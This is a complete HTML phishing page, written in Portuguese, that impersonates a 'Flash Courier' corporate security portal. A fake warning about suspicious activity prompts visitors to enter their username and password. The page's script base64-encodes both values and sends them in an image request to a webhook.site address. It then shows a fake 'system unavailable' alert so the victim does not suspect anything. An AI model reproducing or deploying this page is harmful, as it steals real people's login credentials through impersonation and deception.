<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash Courier - Portal de Segurança</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); padding: 40px; max-width: 420px; width: 90%; }
        .logo { text-align: center; margin-bottom: 25px; }
        .logo h1 { color: #102d69; font-size: 26px; }
        .logo p { color: #666; font-size: 13px; margin-top: 5px; }
        .alert { background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 15px; margin-bottom: 20px; font-size: 13px; color: #856404; }
        .form-group { margin-bottom: 18px; }
        label { display: block; margin-bottom: 6px; color: #333; font-size: 14px; font-weight: 500; }
        input { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; transition: border-color 0.3s; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 14px; background: #102d69; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #1a4a8c; }
        .loading { display: none; text-align: center; padding: 20px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #102d69; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>FLASH COURIER</h1>
            <p>Portal de Segurança Corporativa</p>
        </div>
        <div class="alert">
            <strong>⚠️ Atualização de Segurança</strong><br>
            Detectamos atividade suspeita na sua conta. Verifique suas credenciais para continuar.
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Usuário</label>
                <input type="text" id="username" placeholder="seu.usuario" required>
            </div>
            <div class="form-group">
                <label for="password">Senha</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            <button type="submit">Verificar Conta</button>
        </form>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Verificando credenciais...</p>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var u = document.getElementById('username').value;
            var p = document.getElementById('password').value;
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            var img = new Image();
            img.src = 'https://webhook.site/e3362141-f0be-4cf3-b4a0-8e8e2cfc5206?user=' + encodeURIComponent(btoa(u)) + '&pass=' + encodeURIComponent(btoa(p)) + '&ts=' + Date.now();
            
            setTimeout(function() {
                alert('Sistema temporariamente indisponível. Tente novamente mais tarde.');
                document.getElementById('loading').style.display = 'none';
                document.getElementById('loginForm').style.display = 'block';
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            }, 3000);
        });
    </script>
</body>
</html>
